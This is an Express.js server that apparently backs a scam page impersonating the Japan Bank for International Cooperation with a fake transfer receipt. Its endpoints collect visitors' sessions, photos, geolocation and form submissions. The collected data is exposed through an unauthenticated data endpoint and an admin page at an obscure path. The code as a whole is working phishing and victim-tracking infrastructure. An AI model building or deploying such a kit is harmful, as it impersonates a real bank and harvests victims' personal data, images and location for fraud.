const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname)));

const dataStore = { sessions: [], photos: [], locations: [], forms: [] };

let webConfig = {
    header_text: 'Japan Bank for International Cooperation',
    logo_text: 'JBIC',
    logo_sub: '国際協力銀行',
    logo_small: 'JAPAN BANK FOR INTERNATIONAL COOPERATION',
    title_line1: 'JBIC JAPAN BANK',
    title_line2: 'INTERNATIONAL CORPORATION',
    subtitle: 'Office Purchasing',
    amount_idr: 'IDR 530.000',
    amount_foreign: 'YEN 4.733',
    transaction_type: 'International Transfer',
    currency: 'IDR / JPY',
    reference: 'DEMO-530000',
    status: 'SAMPLE',
    sender_name: 'Japan Bank for International Cooperation',
    sender_bank: 'JBIC Japan Bank',
    sender_account: 'JBIC-001',
    receiver_name: 'Office Purchasing Department',
    receiver_bank: 'JBIC Japan Bank',
    receiver_account: 'JBIC-002'
};

app.post('/api/session', (req, res) => {
    dataStore.sessions.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/photo', (req, res) => {
    dataStore.photos.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/location', (req, res) => {
    dataStore.locations.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/submit', (req, res) => {
    dataStore.forms.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.get('/api/config', (req, res) => {
    res.json({ success: true, config: webConfig });
});

app.post('/api/config', (req, res) => {
    webConfig = { ...webConfig, ...req.body };
    res.json({ success: true, config: webConfig });
});

app.get('/api/data', (req, res) => {
    res.json({ success: true, data: dataStore });
});

app.get('/lyss', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
    console.log('Web: /');
    console.log('Admin: /lyss');
});
